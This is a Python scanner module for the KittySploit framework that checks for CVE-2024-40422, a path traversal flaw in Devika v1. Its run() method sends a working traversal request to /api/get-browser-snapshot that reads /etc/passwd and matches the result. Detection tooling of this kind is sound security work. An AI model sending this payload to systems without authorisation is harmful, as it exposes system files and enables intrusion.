#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The snapshot_path parameter in the /api/get-browser-snapshot endpoint in stitionai devika v1 is susceptible to."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Devika v1 - Path Traversal Detection',
        'description': 'The snapshot_path parameter in the /api/get-browser-snapshot endpoint in stitionai devika v1 is susceptible to a path traversal attack. An attacker can manipulate the snapshot_path parameter to traverse directories and access sensitive files on the server. This can potentially lead to unauthorized access to critical system files and compromise the confidentiality and integrity of the system.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'devika', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2024-40422',
            'https://cvefeed.io/vuln/detail/CVE-2024-40422',
            'https://github.com/alpernae/CVE-2024-40422',
            'https://github.com/stitionai/devika',
            'https://www.exploit-db.com/exploits/52066',
        ],
        'cve': 'CVE-2024-40422',
    }

    def run(self):
        path = '/api/data'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/api/get-browser-snapshot?snapshot_path=../../../../etc/passwd'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        header_any = ('application/octet-stream',)
        body_regexes = ('root:.*:0:0:',)
        if (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='critical', reason='Devika v1 - Path Traversal detected', path=path)
            return True
        return False

